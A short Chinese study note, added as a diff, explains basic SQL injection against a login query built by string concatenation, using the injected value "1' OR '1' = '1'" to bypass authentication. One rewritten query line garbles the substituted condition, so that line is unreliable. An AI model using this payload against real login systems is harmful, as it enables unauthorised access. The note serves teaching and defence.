@@ -1,0 +1,10 @@
+最简单的sql注入：
+	某个网站的登录验证的sql查询代码为：
+	strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '" + password + "');"
+	恶意填入 userName = "1' OR '1' = '1'"
+			password = "1' OR '1' = '1'"
+	原本sql将会变成：
+	strSQL = "SELECT * FROM users WHERE (name = '1' OR '1') and (pw = '1' OR '1' = '1');"
+	实际sql将变为：
+	strSQL = "SELECT * FROM users;"
+	因此达到无账号和密码登录。
